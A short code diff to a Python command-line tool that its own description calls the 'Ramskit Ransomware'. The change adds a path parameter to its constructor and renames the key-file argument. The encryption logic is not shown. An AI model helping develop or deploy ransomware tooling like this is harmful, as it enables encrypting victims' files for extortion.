@@ -21,8 +21,9 @@ import argparse
 from cryptography.fernet import Fernet
 
 class Ramskit:
-    def __init__(self, key):
+    def __init__(self, key, path):
         self.key = key
+        self.path = path
     
     def generate_key(self):
         key = Fernet.generate_key()
@@ -58,7 +59,7 @@ class Ramskit:
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description="Ramskit - CLI Tool for Ramskit Ransomware")
     parser.add_argument('-a', '--action', dest="action", required=True, help='Action to perform [encrypt/decrypt/generate_key]')
-    parser.add_argument('-k', '--key', dest="key", help='Key file')
+    parser.add_argument('-k', '--key', dest="keyfile", help='Key file')
     parser.add_argument('-p', '--path', dest="path", required=True, help='Path to file(s) to encrypt/decrypt')
     args = parser.parse_args()
 
